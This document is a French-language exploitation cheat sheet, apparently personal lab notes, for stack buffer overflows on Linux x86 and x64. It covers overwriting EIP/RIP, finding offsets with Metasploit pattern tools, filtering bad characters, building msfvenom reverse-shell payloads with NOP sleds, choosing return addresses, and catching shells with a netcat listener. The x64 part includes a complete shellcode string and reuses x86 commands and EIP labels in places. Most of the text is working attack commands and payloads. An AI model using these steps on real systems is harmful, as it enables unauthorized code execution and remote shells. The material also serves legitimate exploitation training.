
> [!warning]
> Tester l'exploit sur un environnement monté identique a celui de la victime pour s'assurer qu'il ne cause pas de crash système


[[#x86]]
[[#x64]]


# x86


[[#1. Prendre le contrôle de l'EIP (Pointer d'instruction)]]
[[#2. Déterminer la longueur pour le Shell code]]
[[#3. Identifier les mauvais caractères]]
[[#4. Générer le Shell code]]
[[#5. Identifier l'adresse de retour]]


# 1. Prendre le contrôle de l'EIP (Pointer d'instruction)

Prendre contrôle de l'EIP (Pointer d'instruction) pour faire le jump sur la bonne adresse ou se trouve le shellcode afin de l'exécuter.

## Segmentation Fault

Essayer d'overwrite l'EIP avec un nombre de caractères envoyés.

```shell-session
gdb -q <prog>
```

```assembly
set disassembly-flavor intel
```

```
run $(python -c "print '\x55' * 1200")
```

Program received signal SIGSEGV, Segmentation fault.
0x55555555 in ?? ()

Vérifier que l'adresse de l'EIP a été overwrite (0x55555555...)

```shell-session
info registers 
```

## Determiner l'Offset

Déterminer le nombre d'octets nécessaires pour overwrite le buffer.

1. Creér un pattern

```shell-session
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1200 > pattern.txt
cat pattern.txt
```

2. Lancer gdb sur le programme

```shell-session
gdb -q <prog>
```

3. Utiliser le pattern genéré

```shell-session
(gdb) run $(python -c "print '<pattern>'") 
```


4. Identifier l'adresse de l'EIP

```shell-session
(gdb) info registers eip
```

5. Calculer le nombre exact de caractères nécessaires pour jump sur l'EIP

```shell-session
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q <EIP_adresse>
```

6. Envoyer le nombre de caractères identifiés pour overwrite l'EIP et rajouter quelques caractères afin de confirmer.

```shell-session
run $(python -c "print '\x55' * <nb_caractères> + '\x66' * 4")
```




---
# 2. Déterminer la longueur pour le Shell code


1. Générer un shellcode avec msfvenom (reverse shell), identifier le payload size et reserver au moins le double.

```shell-session
msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 lport=31337 --platform linux --arch x86 --format c
```


Rajouter des NOPS (no operations) entre le buffer et le shellcode (optionnel)

1. We need a total of X octets to get to the `EIP`.
2. Here, we can use an additional `100 octets` of `NOPs`
3. `150 octets` for our `shellcode` (payload size x2).
4. 4 bytes for the EIP

  Determine the Length for Shellcode

```shell-session
   Buffer = "\x55" * (<nb_caractères> - 100 - 150) = ?
     NOPs = "\x90" * 100
Shellcode = "\x44" * 150
      EIP = "\x66" * 4
```

exemple avec 1036 octets pour arriver à l'EIP
![[Pasted image 20250523011000.png]]

# 3. Identifier les mauvais caractères


Identifier les caractères rejetés par l'applications (entre x00 et xff)

1. Genérer la liste de caractère suivante 

```shell-session
CHARS="\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
```

2. Calculer la longueur de char (logiquement 256 octets)

```shell-session
echo $CHARS | sed 's/\\x/ /g' | wc -w
```

3. Recalculer la taille du buffer

```shell-session
Buffer = "\x55" * (<nb_caractères> - 256) = ?
 CHARS = "\x00\x01\x02\x03\x04\x05...<SNIP>...\xfd\xfe\xff"
   EIP = "\x66" * 4
```

4. Afficher la fonction main

```shell-session
(gdb) disas main
```

5. Mettre un breakpoint sur la première fonction

```shell-session
(gdb) break <funct> 
```

6. Send CHARS

```shell-session
(gdb) run $(python -c 'print "\x55" * (<nb_caractères> - 256) + "\x00\x01\x02\x03\x04\x05...<SNIP>...\xfc\xfd\xfe\xff" + "\x66" * 4')
```


7. Afficher la stack

```
x/2000xb $esp+500
```

8. trouver l'adresse a laquelle se termine nos x55 et ou commence x00, x01, x02...
9. Identifier les caractères manquants ou modifiés un par un.
10. Soustraire le nombre de mauvais caractères pour recalculer le buffer
11. Renvoyer le CHARS sans les mauvais caractères

```shell-session
(gdb) run $(python -c 'print "\x55" * (<nb_caractères> - X) + "\x01\x02\x03\x04\x05\x06\x07\x08\x0a\x0b...<SNIP>...\xfc\xfd\xfe\xff" + "\x66" * 4')
```


REPETER LE PROCESS JUSQU'A + AUCUN MAUVAIS CARACTERE.


# 4. Générer le Shell code

Régénérer un Shell code en prenant bien en compte:

- `Architecture`
- `Platform`
- `Bad Characters`

1. Générer le shell code
```shell-session
msfvenom -p linux/x86/shell_reverse_tcp lhost=<LHOST> lport=<LPORT> --format c --arch x86 --platform linux --bad-chars "\x00\x09..." --out shellcode
```

```shell-session
cat shellcode
```

2. Reformatter en une seule ligne

3. Recalculer le buffer avec le payload size cette fois ci.

```shell-session
Buffer = "\x55" * (<nb_caracteres> - 100 - <payload_size>) = ?
     NOPs = "\x90" * 100
Shellcode = "\xda\xca\xba\xe4\x11...<SNIP>...\x5a\x22\xa2"
      EIP = "\x66" * 4'
```

4. Envoyer le payload final

```shell-session
run $(python -c 'print "\x55" * (<nb_caracteres> - 100 - <payload_size>) + "\x90" * 100 + "\xda\xca\xba\xe4...<SNIP>...\xad\xec\xa0\x04\x5a\x22\xa2" + "\x66" * 4')
```

5. Vérifier que le premier octet du shell code est intègre après les NOPs dans la stack

```shell-session
x/2000xb $esp+550
```


Possible d'afficher la taille de la stack

```
info proc all
```


# 5. Identifier l'adresse de retour

1. Choisir une adresse dans la stack qui correspond a nos NOPs (0x90) et qui ne contient aucun mauvais caractère identifiés précédemment.

2. Modifier l'EIF avec l'adresse choisie (en Little Endian donc à l'envers)

```shell-session
Buffer = "\x55" * (<nb_caracteres> - 100 - <payload_size>) = ?
     NOPs = "\x90" * 100
Shellcode = "\xda\xca\xba\xe4\x11...<SNIP>...\x5a\x22\xa2"
      EIP = "\x4c\xd6\xff\xff"
```

3. Lancer listener netcat

```bash
nc -nvlp 9001
```

4. Exécuter le programme en dehors de gdb avec le payload final

```shell-session
./<prog> $(python -c 'print "\x55" * (<nb_caracteres> - 100 - <payload_size>) + "\x90" * 100 + "\xda\xca\xba...<SNIP>...\x5a\x22\xa2" + "\x4c\xd6\xff\xff"')
```

```shell-session
(python -c 'print "\x55" * (<nb_caracteres> - 100 - <payload_size>) + "\x90" * 100 + "\xda\xca\xba...<SNIP>...\x5a\x22\xa2" + "\x4c\xd6\xff\xff"') | ./<prog>
```




---

# x64


[[#1. Prendre le contrôle du RIP (Pointer d'instruction)]]
[[#2. Déterminer la longueur pour le Shell code]]
[[#3. Identifier les mauvais caractères]]
[[#4. Générer le Shell code]]
[[#5. Identifier l'adresse de retour]]


# 1. Prendre le contrôle du RIP (Pointer d'instruction)

Prendre contrôle de l'EIP (Pointer d'instruction) pour faire le jump sur la bonne adresse ou se trouve le shellcode afin de l'exécuter.

## Segmentation Fault

Essayer d'overwrite le RIP avec un nombre de caractères envoyés.

```shell-session
gdb -q <prog>
```

```assembly
set disassembly-flavor intel
```

```
run $(python -c "print '\x55' * 1200")
```

Program received signal SIGSEGV, Segmentation fault.
0x55555555 in ?? ()

Vérifier que l'adresse du RIP a été overwrite (0x55555555...)

```shell-session
info registers rip
```

Si le rip n'apparait pas overwrite pas de panique, -> determiner l'offset.

## Determiner l'Offset

Déterminer le nombre d'octets nécessaires pour overwrite le buffer.

1. Creér un pattern depuis gdb peda

```shell-session
pattern create 200
```

2. Utiliser le pattern genéré

```shell-session
run '<pattern>'
```

3. Identifier l'offset

```shell-session
pattern_search
```

![[Pasted image 20250529053005.png]]

4. Envoyer le nombre de caractères identifiés pour overwrite le RIP et rajouter 8 bytes afin de confirmer.

```shell-session
run $(python -c "print '\x55' * <nb_caractères> + '\x41\x41\x41\x41\x41\x41\x00\x00'")
```


---
# 2. Déterminer la longueur pour le Shell code


1. Générer un shellcode avec msfvenom (reverse shell), identifier le payload size et reserver au moins le double.

```shell-session
msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 lport=31337 --platform linux --arch x86 --format c
```


Rajouter des NOPS (no operations) entre le buffer et le shellcode (optionnel)

1. We need a total of X octets to get to the `RIP`.
2. Here, we can use an additional `100 octets` of `NOPs`
3. `150 octets` for our `shellcode` (payload size x2).
4. 8 bytes for the RIP

  Determine the Length for Shellcode

```shell-session
   Buffer = "\x55" * (<nb_caractères> - 100 - 150) = ?
     NOPs = "\x90" * 100
Shellcode = "\x44" * 150
      EIP = "\x41" * 6 + "\x41" * 2
```

exemple avec 1036 octets pour arriver à l'EIP
![[Pasted image 20250523011000.png]]

# 3. Identifier les mauvais caractères


Identifier les caractères rejetés par l'applications (entre x00 et xff)

1. Genérer la liste de caractère suivante 

```shell-session
CHARS="\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
```

2. Calculer la longueur de char (logiquement 256 octets)

```shell-session
echo $CHARS | sed 's/\\x/ /g' | wc -w
```

3. Recalculer la taille du buffer

```shell-session
Buffer = "\x55" * (<nb_caractères> - 256) = ?
 CHARS = "\x00\x01\x02\x03\x04\x05...<SNIP>...\xfd\xfe\xff"
   RIP = "\x66" * 8
```

4. Afficher la fonction main

```shell-session
disas main
```

5. Mettre un breakpoint sur la première fonction

```shell-session
break <funct> 
```

6. Send CHARS

```shell-session
run $(python -c 'print "\x55" * (<nb_caractères> - 256) + "\x00\x01\x02\x03\x04\x05...<SNIP>...\xfc\xfd\xfe\xff" + "\x66" * 8')
```


7. Afficher la stack

```
x/2000xb $esp+500
```

8. trouver l'adresse a laquelle se termine nos x55 et ou commence x00, x01, x02...
9. Identifier les caractères manquants ou modifiés un par un.
10. Soustraire le nombre de mauvais caractères pour recalculer le buffer
11. Renvoyer le CHARS sans les mauvais caractères

```shell-session
(gdb) run $(python -c 'print "\x55" * (<nb_caractères> - X) + "\x01\x02\x03\x04\x05\x06\x07\x08\x0a\x0b...<SNIP>...\xfc\xfd\xfe\xff" + "\x66" * 8')
```


REPETER LE PROCESS JUSQU'A + AUCUN MAUVAIS CARACTERE.


# 4. Générer le Shell code

Régénérer un Shell code en prenant bien en compte:

- `Architecture`
- `Platform`
- `Bad Characters`


shell code pour appeler /bin/sh -> https://shell-storm.org/shellcode/files/shellcode-806.html


1. Générer le shell code
```shell-session
msfvenom -p linux/x86/shell_reverse_tcp lhost=<LHOST> lport=<LPORT> --format c --arch x86 --platform linux --bad-chars "\x00\x09..." --out shellcode
```

```shell-session
cat shellcode
```

2. Reformatter en une seule ligne

3. Recalculer le buffer avec le payload size cette fois ci.

```shell-session
Buffer = "\x55" * (<nb_caracteres> - 100 - <payload_size>) = ?
     NOPs = "\x90" * 100
Shellcode = "\xda\xca\xba\xe4\x11...<SNIP>...\x5a\x22\xa2"
      EIP = "\x66" * 4'
```

4. Envoyer le payload final

```shell-session
run $(python -c 'print "\x55" * (<nb_caracteres> - 100 - <payload_size>) + "\x90" * 100 + "\xda\xca\xba\xe4...<SNIP>...\xad\xec\xa0\x04\x5a\x22\xa2" + "\x66" * 4')
```

5. Vérifier que le premier octet du shell code est intègre après les NOPs dans la stack

```shell-session
x/2000xb $esp+550
```


Possible d'afficher la taille de la stack

```
info proc all
```


# 5. Identifier l'adresse de retour

1. Compiler le code suivant
getenvvar.c
```
// code by Jon Erickson, page 147 and 148 of Hacking: The Art of Exploitation, 2nd Edition

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char *argv[]) {
	char *ptr;

	if(argc < 3) {
		printf("Usage: %s <environment variable> <target program name>\n", argv[0]);
		exit(0);
	}
	ptr = getenv(argv[1]); /* get env var location */
	ptr += (strlen(argv[0]) - strlen(argv[2]))*2; /* adjust for program name */
	printf("%s will be at %p\n", argv[1], ptr);
}
```

```
gcc getenvvar.c -o getenvvar
```

2. Exporter le shell code dans une variable d'environment

```
export PWN=`python2.7 -c 'print "\x48\x31\xc9\x48\x81\xe9\xfd\xff\xff\xff\x48\x8d\x05\xef\xff\xff\xff\x48\xbb\xf2\xfc\x73\xdf\x15\xee\x93\x23\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\xba\x44\x5c\xbd\x7c\x80\xbc\x50\x9a\xfc\xea\x8f\x41\xb1\xc1\x7d\x98\xc7\x2b\xd0\x10\xee\x93\x23"'`
```

3. Identifier l'adresse de retour

```
getenvvar PWN ./<prog>
```


4. Modifier l'EIF avec l'adresse de retour (en Little Endian donc à l'envers + canonical (0x7fffffffe7b9 -> \xb9\xe7\xff\xff\xff\x7f\x00\x00))

5. Lancer listener netcat (ou pas)

```bash
nc -nvlp 9001
```

4. Exécuter le programme en dehors de gdb avec l'adresse de retour

```shell-session
./<prog> $(python -c 'print "\x55" * <nb_caracteres> + "\xb9\xe7\xff\xff\xff\x7f\x00\x00"')
```

```shell-session
(python -c 'print "\x55" * <nb_caracteres> + "\xb9\xe7\xff\xff\xff\x7f\x00\x00"') | ./<prog>
```
